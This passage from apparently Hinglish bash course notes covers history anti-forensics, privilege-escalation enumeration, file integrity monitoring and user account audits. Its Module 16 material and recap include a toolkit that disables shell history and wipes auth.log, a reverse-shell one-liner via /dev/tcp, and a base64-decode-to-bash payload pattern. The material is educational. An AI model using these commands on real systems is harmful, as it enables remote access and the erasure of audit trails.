set -o history

# Don't save specific command (space prefix)
 secret_command

# Delete specific entry
history -d 1234

# Prevent history save on exit
kill -9 $$

# History size
echo $HISTSIZE
echo $HISTFILESIZE

# Disable for session
export HISTFILE=/dev/null
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Anti-forensics toolkit

set -euo pipefail

# Disable history
disable_history() {
    unset HISTFILE
    set +o history
    export HISTFILE=/dev/null
    export HISTSIZE=0
    
    echo "✓ History disabled"
}

# Clear all traces
clear_traces() {
    # Clear history
    history -c
    
    # Delete history file
    rm -f ~/.bash_history
    
    # Clear logs
    > ~/.bash_logout
    
    # Clear recent commands
    > /var/log/auth.log 2>/dev/null || true
    
    echo "✓ Traces cleared"
}

# Stealth mode
stealth_mode() {
    # Disable history
    unset HISTFILE
    set +o history
    
    # Disable logging
    unset PROMPT_COMMAND
    
    # Clear on exit
    trap 'history -c; rm -f ~/.bash_history' EXIT
    
    echo "✓ Stealth mode enabled"
}

# Clean exit
clean_exit() {
    history -c
    rm -f ~/.bash_history
    kill -9 $$
}

# Selective history
selective_history() {
    # Save only specific commands
    export HISTIGNORE="ls*:cd*:pwd:clear:history*"
}

# Timestamp removal
remove_timestamps() {
    unset HISTTIMEFORMAT
}

# History analysis
analyze_history() {
    echo "=== History Analysis ==="
    
    if [ -f ~/.bash_history ]; then
        echo "History file exists"
        echo "Lines: $(wc -l < ~/.bash_history)"
        echo "Last command: $(tail -1 ~/.bash_history)"
    else
        echo "No history file"
    fi
}

# Secure session
secure_session() {
    cat <<'EOF'
# Add to ~/.bashrc for secure sessions

# Disable history
unset HISTFILE
set +o history

# Or redirect to /dev/null
export HISTFILE=/dev/null

# Ignore specific commands
export HISTIGNORE="ls*:cd*:pwd:clear:history*"

# Clear on exit
trap 'history -c' EXIT
EOF
}

main() {
    local action=${1:-help}
    
    case $action in
        disable)
            disable_history
            ;;
        clear)
            clear_traces
            ;;
        stealth)
            stealth_mode
            ;;
        analyze)
            analyze_history
            ;;
        secure)
            secure_session
            ;;
        *)
            cat <<EOF
Usage: $0 {disable|clear|stealth|analyze|secure}

⚠️  EDUCATIONAL PURPOSES ONLY
⚠️  USE RESPONSIBLY
EOF
            ;;
    esac
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **History clear bhoolna:** Exit par save hota hai
- ❌ **Logs ignore:** Other logs bhi hain
- ❌ **Incomplete cleanup:** Multiple traces

### 10. **Best Practices / Pro Tips**
- 💡 **`unset HISTFILE`:** Session start par
- 💡 **Space prefix:** Single commands ke liye
- 💡 **Kill session:** `kill -9 $$` clean exit
- 💡 **Multiple logs:** Sab clear karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Pentesting session setup

pentest_session() {
    echo "=== Pentesting Session Setup ==="
    
    # Disable history
    unset HISTFILE
    set +o history
    export HISTFILE=/dev/null
    
    # Clear existing
    history -c
    
    # Setup cleanup on exit
    trap 'history -c; rm -f ~/.bash_history; kill -9 $$' EXIT INT TERM
    
    echo "✓ Stealth mode active"
    echo "✓ History disabled"
    echo "✓ Cleanup on exit configured"
    
    # Start work
    bash
}

pentest_session
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `unset HISTFILE` disable
- ✅ `history -c` clear
- ✅ Space prefix for single
- ✅ `kill -9 $$` clean exit
- ✅ Multiple traces exist

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: History completely hide ho sakti hai?**
A: Bash history yes, but other logs exist.

**Q2: Space prefix kaise kaam karta hai?**
A: Command history mein save nahi hota.

**Q3: Legal hai?**
A: Apne system par yes, authorized use.

### 14. **Practice ke liye Task**

```bash
# 1. View history
history

# 2. Clear
history -c

# 3. Disable
unset HISTFILE

# 4. Space prefix
 whoami

# 5. Check
history | grep whoami

# 6. Re-enable
set -o history
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📜 Bash history tracks commands
- 🚫 unset HISTFILE disables
- 🧹 history -c clears
- 👻 Space prefix hides single
- ⚠️ Other logs exist

> **💡 Ye Zaroor Yaad Rakhein:**
> History anti-forensics! unset HISTFILE disable. Space prefix single commands. history -c clear. Other logs bhi hain. LEGAL USE - authorization!

---

# **🎉 Module 16 Complete! 🎉**

## **Aapne Kya Seekha:**
✅ **curl & wget** - Web requests
✅ **netcat** - Networking Swiss Army knife
✅ **Reverse/Bind Shells** - Remote access
✅ **Obfuscation** - Code hiding
✅ **Anti-Forensics** - History management

## **Networking & Security Essentials:**

```bash
# Web requests
curl -X POST -d "data" https://api.example.com
wget https://example.com/file.zip

# Port scanning
nc -zv host 1-1000

# Reverse shell
bash -i >& /dev/tcp/IP/PORT 0>&1

# Obfuscation
echo "command" | base64
echo "encoded" | base64 -d | bash

# Anti-forensics
unset HISTFILE
history -c
```

## **⚠️ CRITICAL WARNINGS:**
- 🚨 **LEGAL USE ONLY** - Authorization required
- 🚨 **EDUCATIONAL PURPOSES** - Learning only
- 🚨 **AUTHORIZED SYSTEMS** - Permission mandatory
- 🚨 **ETHICAL HACKING** - Responsible use
- 🚨 **CTF/LAB ONLY** - Practice environments

## **Pentesting Toolkit:**
- 🌐 curl/wget - API testing
- 🔧 netcat - Port scanning
- 🐚 Shells - Remote access
- 🎭 Obfuscation - Evasion
- 👻 Anti-forensics - Stealth

## **Best Practices:**
- ✅ Always get authorization
- ✅ Document everything
- ✅ Use in labs/CTFs
- ✅ Understand legal implications
- ✅ Ethical hacking only

## **Common Patterns:**

```bash
# API health check
curl -sf https://api.example.com/health

# Port scan
nc -zv target 1-1000

# Obfuscated payload
echo "$(echo 'command' | base64)" | base64 -d | bash

# Stealth session
unset HISTFILE; set +o history
```

**💡 Remember:** Networking & security powerful! curl APIs, netcat scanning, shells remote access. Obfuscation evasion. ALWAYS LEGAL - authorization zaroori! 🚀

---

**⚠️ DISCLAIMER:**
All techniques in this module are for EDUCATIONAL PURPOSES ONLY. Use only on systems you own or have explicit written authorization to test. Unauthorized access is illegal. Always follow ethical hacking guidelines and local laws.

---
=============================================================

# **Bash Shell Scripting: Zero-to-Automation Notes (Module 17)**

---

## **PART 4: ADVANCED TOOLS & REAL-WORLD AUTOMATION**

---

# **Module 17: Practical Scripting Projects (Concepts)**

---

## **Topic 1: Privilege Escalation Script (Concept: Find SUID, check cron, find world-writable)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Privilege Escalation Script** - System vulnerabilities find karne ka automated tool.

### 2. **Ye Kya Hai? (What is it?)**
Privilege escalation script system ko scan karta hai common misconfigurations ke liye - SUID binaries, writable cron jobs, world-writable files. Pentesting aur security audits ke liye.

**Analogy:** Privilege escalation script ek security inspector hai jo building mein weak points dhoondhta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Security audit** - Vulnerabilities find
- ✅ **Pentesting** - Privilege escalation paths
- ✅ **Hardening** - System secure karna
- ✅ **Compliance** - Security standards

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Security audits
- Pentesting (authorized)
- System hardening
- Compliance checks

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Missed vulnerabilities
- Security breaches
- Privilege escalation attacks
- Compliance failures

### 6. **Syntax aur Common Options**

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# World-writable files
find / -perm -002 -type f 2>/dev/null

# World-writable directories
find / -perm -002 -type d 2>/dev/null

# Check cron jobs
ls -la /etc/cron*
cat /etc/crontab
```

### 7. **Example 1 (Basic)**

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check writable cron
find /etc/cron* -writable 2>/dev/null

# World-writable files
find /tmp -perm -002 -type f 2>/dev/null

# Check sudo permissions
sudo -l

# Check capabilities
getcap -r / 2>/dev/null

# Writable /etc/passwd
ls -la /etc/passwd

# Check PATH
echo $PATH
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Privilege Escalation Enumeration Script

set -euo pipefail

readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly NC='\033[0m'

banner() {
    echo "=================================="
    echo "Privilege Escalation Enumeration"
    echo "=================================="
}

# SUID binaries
check_suid() {
    echo -e "${YELLOW}[*] Checking SUID binaries...${NC}"
    
    find / -perm -4000 -type f 2>/dev/null | while read file; do
        echo -e "${RED}[!] SUID: $file${NC}"
    done
}

# SGID binaries
check_sgid() {
    echo -e "${YELLOW}[*] Checking SGID binaries...${NC}"
    
    find / -perm -2000 -type f 2>/dev/null | while read file; do
        echo -e "${RED}[!] SGID: $file${NC}"
    done
}

# World-writable files
check_writable() {
    echo -e "${YELLOW}[*] Checking world-writable files...${NC}"
    
    find / -perm -002 -type f 2>/dev/null | grep -v proc | head -20
}

# Cron jobs
check_cron() {
    echo -e "${YELLOW}[*] Checking cron jobs...${NC}"
    
    ls -la /etc/cron* 2>/dev/null
    cat /etc/crontab 2>/dev/null
    
    # User crontabs
    for user in $(cut -d: -f1 /etc/passwd); do
        crontab -l -u "$user" 2>/dev/null && echo "Crontab for $user"
    done
}

# Sudo permissions
check_sudo() {
    echo -e "${YELLOW}[*] Checking sudo permissions...${NC}"
    
    sudo -l 2>/dev/null || echo "Cannot check sudo"
}

# Capabilities
check_capabilities() {
    echo -e "${YELLOW}[*] Checking capabilities...${NC}"
    
    getcap -r / 2>/dev/null
}

# Writable /etc files
check_etc() {
    echo -e "${YELLOW}[*] Checking writable /etc files...${NC}"
    
    find /etc -writable -type f 2>/dev/null
}

# PATH hijacking
check_path() {
    echo -e "${YELLOW}[*] Checking PATH...${NC}"
    
    echo "$PATH" | tr ':' '\n' | while read dir; do
        if [ -w "$dir" ]; then
            echo -e "${RED}[!] Writable PATH: $dir${NC}"
        fi
    done
}

# NFS exports
check_nfs() {
    echo -e "${YELLOW}[*] Checking NFS exports...${NC}"
    
    cat /etc/exports 2>/dev/null
    showmount -e 2>/dev/null
}

# Kernel exploits
check_kernel() {
    echo -e "${YELLOW}[*] Kernel version...${NC}"
    
    uname -a
    cat /proc/version
}

main() {
    banner
    check_suid
    check_sgid
    check_writable
    check_cron
    check_sudo
    check_capabilities
    check_etc
    check_path
    check_nfs
    check_kernel
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Unauthorized use:** Permission zaroori
- ❌ **Incomplete checks:** Multiple vectors
- ❌ **False positives:** Verify findings

### 10. **Best Practices / Pro Tips**
- 💡 **Authorized only:** Permission leke use
- 💡 **Multiple checks:** All vectors cover
- 💡 **Document findings:** Report banao
- 💡 **Verify exploits:** Test carefully

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Quick privilege escalation check

quick_check() {
    echo "=== Quick PrivEsc Check ==="
    
    # SUID
    echo "SUID binaries:"
    find / -perm -4000 2>/dev/null | grep -E 'nmap|vim|find|bash|more|less|nano'
    
    # Sudo
    echo "Sudo permissions:"
    sudo -l 2>/dev/null
    
    # Writable /etc/passwd
    if [ -w /etc/passwd ]; then
        echo "⚠️  /etc/passwd is writable!"
    fi
}

quick_check
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ Find SUID binaries
- ✅ Check cron jobs
- ✅ World-writable files
- ✅ Sudo permissions
- ✅ Authorization required

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Legal hai?**
A: Authorized systems par only.

**Q2: SUID kyun dangerous?**
A: Root privileges mil sakte hain.

**Q3: Kaise protect karu?**
A: Regular audits, least privilege.

### 14. **Practice ke liye Task**

```bash
# ⚠️  ONLY ON YOUR OWN SYSTEMS

# 1. Find SUID
find / -perm -4000 2>/dev/null

# 2. Check cron
ls -la /etc/cron*

# 3. Writable files
find /tmp -perm -002 2>/dev/null

# 4. Sudo
sudo -l
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔍 Finds privilege escalation paths
- 🔐 SUID, cron, writable files
- 🎯 Security audit tool
- ⚠️ Authorization required
- 🛡️ System hardening

> **💡 Ye Zaroor Yaad Rakhein:**
> PrivEsc script security audit! SUID binaries, cron jobs, writable files check. AUTHORIZED USE ONLY. Document findings. Regular audits essential!

---

## **Topic 2: Simple File Integrity Monitor (FIM) (Concept: `md5sum` / `sha256sum`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**File Integrity Monitor** - File changes detect karne ka tool.

### 2. **Ye Kya Hai? (What is it?)**
FIM files ke checksums store karta hai aur regularly compare karta hai changes detect karne ke liye. `md5sum` ya `sha256sum` use karke file integrity verify karta hai.

**Analogy:** FIM ek security seal hai - agar seal tooti toh pata chal jata hai ki tampering hui hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Integrity** - Unauthorized changes detect
- ✅ **Security** - Tampering identify
- ✅ **Compliance** - Audit requirements
- ✅ **Incident response** - Breach detection

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Critical files monitor
- Security compliance
- Incident detection
- System integrity

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Undetected tampering
- Security breaches
- Compliance failures
- Data integrity issues

### 6. **Syntax aur Common Options**

```bash
# Generate checksum
md5sum file.txt
sha256sum file.txt

# Multiple files
md5sum *.txt > checksums.md5
sha256sum *.txt > checksums.sha256

# Verify
md5sum -c checksums.md5
sha256sum -c checksums.sha256

# Recursive
find /etc -type f -exec md5sum {} \; > baseline.md5
```

### 7. **Example 1 (Basic)**

```bash
# Create baseline
md5sum /etc/passwd > passwd.md5

# Verify later
md5sum -c passwd.md5

# Multiple files
md5sum /etc/passwd /etc/shadow > baseline.md5

# Verify
md5sum -c baseline.md5

# SHA256 (more secure)
sha256sum /etc/passwd > passwd.sha256
sha256sum -c passwd.sha256

# Directory baseline
find /etc -type f -exec sha256sum {} \; > etc_baseline.sha256
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# File Integrity Monitor

set -euo pipefail

readonly BASELINE_DIR="/var/lib/fim"
readonly WATCH_DIRS=("/etc" "/usr/bin" "/usr/sbin")
readonly ALERT_EMAIL="admin@example.com"

# Create baseline
create_baseline() {
    echo "Creating baseline..."
    
    mkdir -p "$BASELINE_DIR"
    
    for dir in "${WATCH_DIRS[@]}"; do
        local baseline="$BASELINE_DIR/$(echo $dir | tr '/' '_').sha256"
        
        find "$dir" -type f 2>/dev/null -exec sha256sum {} \; > "$baseline"
        
        echo "✓ Baseline created: $baseline"
    done
}

# Check integrity
check_integrity() {
    echo "Checking integrity..."
    
    local changes=0
    
    for dir in "${WATCH_DIRS[@]}"; do
        local baseline="$BASELINE_DIR/$(echo $dir | tr '/' '_').sha256"
        local current="/tmp/current_$(date +%s).sha256"
        
        if [ ! -f "$baseline" ]; then
            echo "⚠️  No baseline for $dir"
            continue
        fi
        
        # Generate current checksums
        find "$dir" -type f 2>/dev/null -exec sha256sum {} \; > "$current"
        
        # Compare
        local diff_output=$(diff "$baseline" "$current" 2>/dev/null || true)
        
        if [ -n "$diff_output" ]; then
            echo "⚠️  Changes detected in $dir:"
            echo "$diff_output" | head -20
            ((changes++))
            
            # Alert
            echo "FIM Alert: Changes in $dir" | mail -s "FIM Alert" "$ALERT_EMAIL"
        else
            echo "✓ No changes in $dir"
        fi
        
        rm -f "$current"
    done
    
    if [ $changes -gt 0 ]; then
        echo "⚠️  Total directories with changes: $changes"
        return 1
    fi
}

# Update baseline
update_baseline() {
    echo "Updating baseline..."
    
    create_baseline
    
    echo "✓ Baseline updated"
}

# Monitor continuously
monitor() {
    local interval=${1:-3600}
    
    echo "Starting FIM monitor (interval: ${interval}s)..."
    
    while true; do
        check_integrity
        sleep "$interval"
    done
}

# Report
generate_report() {
    echo "=== FIM Report ==="
    echo "Generated: $(date)"
    echo ""
    
    for dir in "${WATCH_DIRS[@]}"; do
        local baseline="$BASELINE_DIR/$(echo $dir | tr '/' '_').sha256"
        
        if [ -f "$baseline" ]; then
            local count=$(wc -l < "$baseline")
            echo "$dir: $count files monitored"
        fi
    done
}

main() {
    local action=${1:-help}
    
    case $action in
        baseline)
            create_baseline
            ;;
        check)
            check_integrity
            ;;
        update)
            update_baseline
            ;;
        monitor)
            monitor "${2:-3600}"
            ;;
        report)
            generate_report
            ;;
        *)
            cat <<EOF
Usage: $0 {baseline|check|update|monitor|report} [args]

Examples:
  $0 baseline          # Create initial baseline
  $0 check             # Check for changes
  $0 update            # Update baseline
  $0 monitor 3600      # Monitor every hour
  $0 report            # Generate report
EOF
            ;;
    esac
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Baseline update nahi:** Regular updates
- ❌ **False positives:** Legitimate changes
- ❌ **Performance:** Large directories slow

### 10. **Best Practices / Pro Tips**
- 💡 **SHA256 > MD5:** More secure
- 💡 **Regular baselines:** Update after changes
- 💡 **Alert system:** Immediate notification
- 💡 **Exclude temp:** Skip temporary files

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Production FIM

readonly CRITICAL_FILES=(
    "/etc/passwd"
    "/etc/shadow"
    "/etc/ssh/sshd_config"
)

monitor_critical() {
    for file in "${CRITICAL_FILES[@]}"; do
        local baseline="/var/lib/fim/$(basename $file).sha256"
        
        if [ ! -f "$baseline" ]; then
            sha256sum "$file" > "$baseline"
            continue
        fi
        
        local current=$(sha256sum "$file" | awk '{print $1}')
        local stored=$(cat "$baseline" | awk '{print $1}')
        
        if [ "$current" != "$stored" ]; then
            echo "⚠️  $file has been modified!"
            echo "Alert: $file modified" | mail -s "FIM Alert" admin@example.com
        fi
    done
}

monitor_critical
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ Create baseline
- ✅ Regular checks
- ✅ Alert on changes
- ✅ SHA256 preferred
- ✅ Update after legitimate changes

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: MD5 vs SHA256?**
A: SHA256 more secure, MD5 faster.

**Q2: Kitni baar check karu?**
A: Critical files: hourly, others: daily.

**Q3: False positives kaise handle?**
A: Whitelist legitimate changes.

### 14. **Practice ke liye Task**

```bash
# 1. Create baseline
sha256sum /etc/passwd > passwd.sha256

# 2. Verify
sha256sum -c passwd.sha256

# 3. Multiple files
find /etc -name "*.conf" -exec sha256sum {} \; > baseline.sha256

# 4. Check
sha256sum -c baseline.sha256
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔐 Monitors file integrity
- 📊 Uses checksums (MD5/SHA256)
- 🚨 Alerts on changes
- 📝 Baseline + regular checks
- 🎯 Security compliance

> **💡 Ye Zaroor Yaad Rakhein:**
> FIM integrity monitor! Baseline banao, regular check karo. SHA256 secure. Alert system setup. Critical files monitor essential!

---

## **Topic 3: Automated User Account Audit (Concept: Parse `/etc/passwd` & `/etc/shadow`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**User Account Audit** - System users ko analyze aur audit karna.

### 2. **Ye Kya Hai? (What is it?)**
User account audit script `/etc/passwd` aur `/etc/shadow` parse karta hai suspicious accounts, weak passwords, inactive users find karne ke liye. Security compliance ke liye essential.

**Analogy:** User audit ek attendance register check karna hai - kaun active hai, kaun nahi, kaun suspicious hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Security** - Unauthorized accounts detect
- ✅ **Compliance** - Audit requirements
- ✅ **Cleanup** - Inactive users remove
- ✅ **Policy enforcement** - Password policies

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Security audits
- Compliance checks
- User cleanup
- Access reviews

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Unauthorized accounts
- Security breaches
- Compliance failures
- Resource waste

### 6. **Syntax aur Common Options**

```bash
# View users
cat /etc/passwd
cut -d: -f1 /etc/passwd

# User details
getent passwd username

# Password info
sudo cat /etc/shadow

# Last login
lastlog

# Active users
who
w
```

### 7. **Example 1 (Basic)**

```bash
# List all users
cut -d: -f1 /etc/passwd

# Users with UID 0 (root privileges)
awk -F: '$3 == 0 {print $1}' /etc/passwd

# Users with shell
grep -v '/nologin\|/false' /etc/passwd

# Users without password
sudo awk -F: '$2 == "" {print $1}' /etc/shadow

# Inactive users
lastlog | grep "Never"

# System vs regular users
awk -F: '$3 >= 1000 {print $1}' /etc/passwd

# Check specific user
getent passwd john
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# User Account Audit Script

set -euo pipefail

readonly REPORT="/tmp/user_audit_$(date +%Y%m%d).txt"

# Generate report header
report_header() {
    cat > "$REPORT" <<EOF
================================
User Account Audit Report
Generated: $(date)
Hostname: $(hostname)
================================

EOF
}

# Find users with UID 0
check_root_users() {
    echo "=== Users with UID 0 (Root Privileges) ===" >> "$REPORT"
    
    awk -F: '$3 == 0 {print $1}' /etc/passwd >> "$REPORT"
    
    local count=$(awk -F: '$3 == 0 {print $1}' /etc/passwd | wc -l)
    
    if [ $count -gt 1 ]; then
        echo "⚠️  WARNING: Multiple root users found!" >> "$REPORT"
    fi
    
    echo "" >> "$REPORT"
}

# Users without password
check_no_password() {
    echo "=== Users Without Password ===" >> "$REPORT"
    
    sudo awk -F: '$2 == "" || $2 == "!" {print $1}' /etc/shadow >> "$REPORT"
    
    echo "" >> "$REPORT"
}

# Inactive users
check_inactive() {
    echo "=== Inactive Users (Never Logged In) ===" >> "$REPORT"
    
    lastlog | grep "Never" | awk '{print $1}' >> "$REPORT"
    
    echo "" >> "$REPORT"
}

# Users with shell access
check_shell_users() {
    echo "=== Users with Shell Access ===" >> "$REPORT"
    
    grep -v '/nologin\|/false' /etc/passwd | cut -d: -f1 >> "$REPORT"
    
    echo "" >> "$REPORT"
}

# Duplicate UIDs
check_duplicate_uids() {
    echo "=== Duplicate UIDs ===" >> "$REPORT"
    
    cut -d: -f3 /etc/passwd | sort | uniq -d | while read uid; do
        echo "UID $uid:" >> "$REPORT"
        awk -F: -v uid="$uid" '$3 == uid {print "  " $1}' /etc/passwd >> "$REPORT"
    done
    
    echo "" >> "$REPORT"
}

# Users in sudo group
check_sudo_users() {
    echo "=== Users in Sudo Group ===" >> "$REPORT"
    
    getent group sudo | cut -d: -f4 | tr ',' '\n' >> "$REPORT"
    
    echo "" >> "$REPORT"
}

# Password aging
check_password_aging() {
    echo "=== Password Aging Info ===" >> "$REPORT"
    
    while IFS=: read -r user pass lastchg min max warn inactive expire flag; do
        if [ "$lastchg" != "" ] && [ "$lastchg" != "0" ]; then
            local days_since=$(($(date +%s) / 86400 - lastchg))
            
            if [ $days_since -gt 90 ]; then
                echo "$user: Password not changed in $days_since days" >> "$REPORT"
            fi
        fi
    done < <(sudo cat /etc/shadow)
    
    echo "" >> "$REPORT"
}

# System vs regular users
categorize_users() {
    echo "=== User Categories ===" >> "$REPORT"
    
    echo "System users (UID < 1000):" >> "$REPORT"
    awk -F: '$3 < 1000 {print "  " $1}' /etc/passwd >> "$REPORT"
    
    echo "" >> "$REPORT"
    
    echo "Regular users (UID >= 1000):" >> "$REPORT"
    awk -F: '$3 >= 1000 && $3 != 65534 {print "  " $1}' /etc/passwd >> "$REPORT"
    
    echo "" >> "$REPORT"
}

# User statistics
user_statistics() {
    echo "=== Statistics ===" >> "$REPORT"
    
    local total=$(wc -l < /etc/passwd)
    local system=$(awk -F: '$3 < 1000' /etc/passwd | wc -l)
    local regular=$(awk -F: '$3 >= 1000 && $3 != 65534' /etc/passwd | wc -l)
    local shell=$(grep -v '/nologin\|/false' /etc/passwd | wc -l)
    
    echo "Total users: $total" >> "$REPORT"
    echo "System users: $system" >> "$REPORT"
    echo "Regular users: $regular" >> "$REPORT"
    echo "Users with shell: $shell" >> "$REPORT"
    
    echo "" >> "$REPORT"
}

# Recommendations
generate_recommendations() {
    echo "=== Recommendations ===" >> "$REPORT"
    
    # Check for issues
    local issues=0
    
    # Multiple root users
    if [ $(awk -F: '$3 == 0' /etc/passwd | wc -l) -gt 1 ]; then
        echo "- Remove additional root users" >> "$REPORT"
        ((issues++))
    fi
    
    # Users without password
    if sudo awk -F: '$2 == ""' /etc/shadow | grep -q .; then
        echo "- Set passwords for users without passwords" >> "$REPORT"
        ((issues++))
    fi
    
    # Inactive users
    if lastlog | grep -q "Never"; then
        echo "- Review and remove inactive users" >> "$REPORT"
        ((issues++))
    fi
    
    if [ $issues -eq 0 ]; then
        echo "No critical issues found" >> "$REPORT"
    fi
    
    echo "" >> "$REPORT"
}

# Main audit
main() {
    echo "Running user account audit..."
    
    report_header
    check_root_users
    check_no_password
    check_inactive
    check_shell_users
    check_duplicate_uids
    check_sudo_users
    check_password_aging
    categorize_users
    user_statistics
    generate_recommendations
    
    echo "✓ Audit complete: $REPORT"
    
    # Display report
    cat "$REPORT"
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Root access nahi:** Shadow file needs sudo
- ❌ **System users ignore:** Focus on regular users
- ❌ **No action:** Audit ke baad cleanup

### 10. **Best Practices / Pro Tips**
- 💡 **Regular audits:** Monthly minimum
- 💡 **Automate:** Cron job setup
- 💡 **Alert on issues:** Email notifications
- 💡 **Document:** Keep audit trail

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Quick user security check

security_check() {
    echo "=== User Security Check ==="
    
    # Root users
    echo "Root users:"
    awk -F: '$3 == 0 {print $1}' /etc/passwd
    
    # No password
    echo ""
    echo "Users without password:"
    sudo awk -F: '$2 == "" {print $1}' /etc/shadow
    
    # Sudo access
    echo ""
    echo "Sudo users:"
    getent group sudo | cut -d: -f4
    
    # Never logged in
    echo ""
    echo "Never logged in:"
    lastlog | grep "Never" | awk '{print $1}' | head -5
}

security_check
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ Parse /etc/passwd
- ✅ Check /etc/shadow
- ✅ Find suspicious accounts
- ✅ Inactive users
- ✅ Regular audits

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Kitni baar audit karu?**
A: Monthly minimum, critical systems weekly.

**Q2: Inactive users kab delete?**
A: 90 days inactive ke baad.

**Q3: System users ko ignore?**
A: Haan, focus on regular users.

### 14. **Practice ke liye Task**

```bash
# 1. List users
cut -d: -f1 /etc/passwd

# 2. Root users
awk -F: '$3 == 0 {print $1}' /etc/passwd

# 3. Shell users
grep -v '/nologin' /etc/passwd

# 4. Last login
lastlog

# 5. Sudo users
getent group sudo
```

### 15. **Aakhri Choti Summary (5 lines)**
- 👥 Audits user accounts
- 🔍 Parses passwd/shadow
- 🚨 Finds suspicious accounts
- 📊 Generates reports
- 🎯 Security compliance

> **💡 Ye Zaroor Yaad Rakhein:**
> User audit security essential! Regular checks. Root users, inactive users, no password check. Automate monthly. Document findings!

---

## **Topic 4: POSIX Compliance (Concept: Making scripts universal)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**POSIX Compliance** - Scripts ko portable aur universal banana.

### 2. **Ye Kya Hai? (What is it?)**
POSIX (Portable Operating System Interface) ek standard hai jo ensure karta hai scripts different Unix systems par run ho sakein. Bash-specific features avoid karke portable scripts banate hain.

**Analogy:** POSIX ek universal adapter hai - ek script, har system par chale.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Portability** - Multiple systems
- ✅ **Compatibility** - Different shells
- ✅ **Reliability** - Standard behavior
- ✅ **Maintenance** - Easier to maintain

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Cross-platform scripts
- Production environments
- Distribution packages
- Shared scripts

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Platform-specific issues
- Compatibility problems
- Limited portability
- Maintenance overhead

### 6. **Syntax aur Common Options**

```bash
# POSIX shebang
#!/bin/sh

# Avoid Bash-specific
# ❌ [[ ]] 
# ✅ [ ]

# ❌ $((++i))
# ✅ i=$((i + 1))

# ❌ ${var,,}
# ✅ echo "$var" | tr 'A-Z' 'a-z'

# Check POSIX compliance
shellcheck script.sh
```

### 7. **Example 1 (Basic)**

```bash
#!/bin/sh
# POSIX compliant script

# Use [ ] not [[ ]]
if [ "$var" = "value" ]; then
    echo "Match"
fi

# Avoid arrays (not POSIX)
# Use space-separated strings
items="item1 item2 item3"
for item in $items; do
    echo "$item"
done

# Avoid $((++i))
i=0
i=$((i + 1))

# Avoid ${var,,}
lower=$(echo "$var" | tr 'A-Z' 'a-z')

# Use command instead of which
if command -v git >/dev/null 2>&1; then
    echo "Git found"
fi

# Avoid process substitution
# ❌ while read line; do ... done < <(command)
# ✅ command | while read line; do ... done
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/sh
# POSIX compliant utility script

set -eu

# Constants
readonly SCRIPT_NAME="$(basename "$0")"
readonly VERSION="1.0.0"

# Logging function
log() {
    printf "[%s] %s\n" "$(date '+%Y-%m-%d %H:%M:%S')" "$1"
}

# Error handling
error() {
    printf "ERROR: %s\n" "$1" >&2
    exit 1
}

# Check command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# String operations (POSIX way)
to_lower() {
    echo "$1" | tr 'A-Z' 'a-z'
}

to_upper() {
    echo "$1" | tr 'a-z' 'A-Z'
}

# File operations
file_exists() {
    [ -f "$1" ]
}

dir_exists() {
    [ -d "$1" ]
}

# Process list (no arrays)
process_list() {
    local items="$1"
    
    for item in $items; do
        log "Processing: $item"
    done
}

# Portable temp file
create_temp() {
    mktemp "${TMPDIR:-/tmp}/script.XXXXXX"
}

# Cleanup
cleanup() {
    log "Cleaning up..."
    # Cleanup code
}

trap cleanup EXIT INT TERM

# Main function
main() {
    log "Starting $SCRIPT_NAME v$VERSION"
    
    # Check prerequisites
    if ! command_exists "awk"; then
        error "awk not found"
    fi
    
